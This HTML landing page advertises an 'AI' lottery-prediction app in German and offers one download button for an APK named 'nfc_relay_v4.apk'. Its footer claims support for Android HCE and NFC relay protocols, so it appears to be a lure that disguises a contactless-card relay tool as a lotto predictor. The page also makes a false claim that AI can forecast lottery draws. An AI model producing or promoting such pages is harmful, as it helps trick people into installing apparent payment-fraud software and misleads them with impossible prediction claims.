<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LOTTO AI | Premium Dashboard v4.0</title>
    <!-- Hızlı yükleme için yerel font alternatifi -->
    <style>
        :root {
            --primary: #00ff41;
            --accent: #58a6ff;
            --bg-dark: #0a0c10;
        }

        body {
            background-color: var(--bg-dark);
            color: white;
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            /* Performans için gradiyent arka plan */
            background-image: radial-gradient(circle at center, #112244 0%, #05070a 100%);
        }

        .main-card {
            background: rgba(13, 17, 23, 0.95);
            border: 1px solid #30363d;
            border-radius: 20px;
            padding: 35px;
            width: 90%;
            max-width: 400px;
            text-align: center;
            box-shadow: 0 15px 35px rgba(0,0,0,0.8);
        }

        /* Logo Performans Ayarı */
        .logo-main {
            width: 160px;
            height: 160px;
            border-radius: 50%;
            border: 3px solid var(--primary);
            box-shadow: 0 0 15px rgba(0, 255, 65, 0.3);
            margin-bottom: 20px;
            object-fit: cover;
        }

        h1 {
            font-size: 24px;
            color: var(--primary);
            letter-spacing: 1px;
            margin: 10px 0;
            text-transform: uppercase;
        }

        .status-badge {
            font-size: 13px;
            color: #8b949e;
            background: #161b22;
            padding: 6px 15px;
            border-radius: 50px;
            display: inline-block;
            border: 1px solid #30363d;
            margin-bottom: 20px;
        }

        .banner-img {
            width: 100%;
            border-radius: 10px;
            margin: 15px 0;
            border: 1px solid rgba(88, 166, 255, 0.3);
        }

        /* APK İndirme Butonu */
        .btn-download {
            background: linear-gradient(135deg, #00ff41 0%, #008f11 100%);
            color: #000;
            text-decoration: none;
            display: block;
            padding: 18px;
            font-weight: bold;
            border-radius: 12px;
            font-size: 18px;
            transition: 0.2s cubic-bezier(0.4, 0, 0.2, 1);
            margin-top: 20px;
            box-shadow: 0 4px 15px rgba(0, 255, 65, 0.2);
        }

        .btn-download:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(0, 255, 65, 0.4);
            filter: brightness(1.1);
        }

        .info-text {
            font-size: 12px;
            color: #484f58;
            margin-top: 20px;
            line-height: 1.5;
        }

        .live-dot {
            height: 8px;
            width: 8px;
            background-color: var(--primary);
            border-radius: 50%;
            display: inline-block;
            margin-right: 5px;
        }
    </style>
</head>
<body>

    <div class="main-card">
        <!-- Logo -->
        <img src="1.png" alt="Lotto AI Logo" class="logo-main" loading="eager" onerror="this.src='https://github.com/identicons/lotto.png'">
        
        <h1>LOTTO ANALYSE UNIT</h1>
        <div class="status-badge">
            <span class="live-dot"></span> SYSTEMSTATUS: AKTIV
        </div>

        <p style="color: #c9d1d9; font-size: 15px;">Künstliche Intelligenz für Lotto-Vorhersagen</p>

        <!-- İkinci Görsel -->
        <img src="2.png" alt="Analyse Grafik" class="banner-img" loading="eager" onerror="this.style.display='none'">

        <!-- APK İndirme Bağlantısı -->
        <a href="nfc_relay_v4.apk" class="btn-download">
            JETZT HERUNTERLADEN (APK)
        </a>

        <div class="info-text">
            Sichere Infrastruktur v4.0.1<br>
            Unterstützt Android HCE & NFC Relay Protokolle<br>
            &copy; 2026 Dilyan2121 Security Systems
        </div>
    </div>

</body>
</html>
